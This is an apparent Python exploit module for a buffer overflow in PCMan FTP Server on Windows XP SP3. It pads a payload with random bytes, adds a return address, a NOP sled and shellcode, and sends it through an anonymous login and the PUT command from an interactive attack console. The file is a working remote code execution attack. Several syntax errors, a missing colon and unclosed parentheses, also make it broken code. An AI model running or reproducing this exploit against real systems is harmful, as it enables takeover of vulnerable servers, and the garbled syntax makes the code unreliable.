import os, sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
import core
class pcmanPutOverflowMenu(core.Exploit):
  def generate(self, p):
    p += self.rand(2017)
    p += "\x77\xc3\x54\x59"
    p += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    p += self.get_shellcode()
    return p
  def deliver(self, p)
    self.init_deliver()
    s = self.connect()
    s.recv(1024)
    s.send("USER " + self.variables["user"]
    s.recv(1024)
    s.send("PASS " + self.variables["passwd"]
    s.recv(1024)
    s.send("PUT " + p)
    self.disconnect(s)
def main():
  pcmanputoverflowmenu = pcmanPutOverflowMenu('pcman_put_overflow', 'Windows XP SP3 English', 'pcman_put.shell', {'user':'anonymous', 'passwd':'anonymous@example.com', 'host':''}, {'user':'the user to login as', 'passwd':'the password to use to login', 'host':'the ip of the target'})
  pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
if __name__ == '__main__':
  main()
